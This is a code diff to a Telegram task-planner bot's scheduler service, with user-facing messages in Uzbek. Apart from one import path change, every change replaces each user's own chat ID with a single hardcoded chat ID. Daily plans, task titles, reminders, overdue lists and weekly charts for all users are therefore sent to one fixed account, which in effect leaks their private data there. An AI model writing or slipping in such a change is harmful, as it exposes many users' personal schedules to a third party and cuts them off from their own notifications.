@@ -1,6 +1,6 @@
 import cron from 'node-cron';
 import { prisma } from '../app';
-import { bot } from '../bot';
+import { bot } from '../bot/instance';
 import { TaskService } from './taskService';
 import { ChartService } from './chartService';
 import { StatsService } from './statsService';
@@ -36,9 +36,9 @@ export class SchedulerService {
                         const time = t.startAt ? format(t.startAt, 'HH:mm') : '??:??';
                         msg += `${time} - ${t.title} (${t.durationMinutes}m) ${t.priority === 'IMPORTANT' ? '🔴' : t.priority === 'NORMAL' ? '🟠' : '🔵'}\n`;
                     });
-                    await bot.telegram.sendMessage(user.telegramChatId, msg);
+                    await bot.telegram.sendMessage('6711922793', msg);
                 } else {
-                    await bot.telegram.sendMessage(user.telegramChatId, `📅 Bugunga reja yo‘q. /plan qilib rejalashtiring.`);
+                    await bot.telegram.sendMessage('6711922793', `📅 Bugunga reja yo‘q. /plan qilib rejalashtiring.`);
                 }
             }
         });
@@ -64,7 +64,7 @@ export class SchedulerService {
                         const start = format(firstGap.start, 'HH:mm');
                         const end = format(firstGap.end, 'HH:mm');
                         const msg = `🔔 Eslatma: Bugun ${start}–${end} oralig‘ida bo‘sh vaqt bor. Biror nima rejalashtiring yoki dam oling!`;
-                        await bot.telegram.sendMessage(user.telegramChatId, msg);
+                        await bot.telegram.sendMessage('6711922793', msg);
                     }
                 }
             });
@@ -86,7 +86,7 @@ export class SchedulerService {
                 if (overdueTasks.length > 0) {
                     let msg = `⚠️ Kechikkan tasklar:\n`;
                     overdueTasks.forEach(t => msg += `- ${t.title}\n`);
-                    await bot.telegram.sendMessage(user.telegramChatId, msg);
+                    await bot.telegram.sendMessage('6711922793', msg);
                 }
             }
         });
@@ -96,7 +96,7 @@ export class SchedulerService {
             const users = await prisma.user.findMany({ where: { telegramChatId: { not: null } } });
             for (const user of users) {
                 if (!user.telegramChatId) continue;
-                await bot.telegram.sendMessage(user.telegramChatId, "📊 Haftalik hisobot tayyorlanmoqda...");
+                await bot.telegram.sendMessage('6711922793', "📊 Haftalik hisobot tayyorlanmoqda...");
 
                 try {
                     const stats = await StatsService.getWeeklyTaskStats(user.id);
@@ -104,14 +104,14 @@ export class SchedulerService {
                     const data = stats.dailyCounts.map(d => d.count);
 
                     if (stats.totalDone === 0) {
-                        await bot.telegram.sendMessage(user.telegramChatId, "Bu hafta hech qanday task bajarilmadi. Keyingi hafta omad!");
+                        await bot.telegram.sendMessage('6711922793', "Bu hafta hech qanday task bajarilmadi. Keyingi hafta omad!");
                     } else {
                         const buffer = await ChartService.generateLineChart('Weekly Tasks', labels, data);
-                        await bot.telegram.sendPhoto(user.telegramChatId, { source: buffer }, { caption: `Haftalik natija: ${stats.totalDone} ta task bajarildi.` });
+                        await bot.telegram.sendPhoto('6711922793', { source: buffer }, { caption: `Haftalik natija: ${stats.totalDone} ta task bajarildi.` });
                     }
                 } catch (error) {
                     console.error('Weekly report error:', error);
-                    await bot.telegram.sendMessage(user.telegramChatId, "Hisobotni shakllantirishda xatolik yuz berdi.");
+                    await bot.telegram.sendMessage('6711922793', "Hisobotni shakllantirishda xatolik yuz berdi.");
                 }
             }
         });
@@ -143,7 +143,7 @@ export class SchedulerService {
                 const message = `⚠️ **Eslatma**: "${task.title}" vazifasi boshlanishiga 30 daqiqa qoldi!\n🕒 Boshlanish vaqti: ${timeStr}`;
 
                 try {
-                    await bot.telegram.sendMessage(task.user.telegramChatId, message, { parse_mode: 'Markdown' });
+                    await bot.telegram.sendMessage('6711922793', message, { parse_mode: 'Markdown' });
                     console.log(`Reminder sent to ${task.userId} for task ${task.id}`);
                 } catch (error) {
                     console.error(`Failed to send reminder for task ${task.id}:`, error);
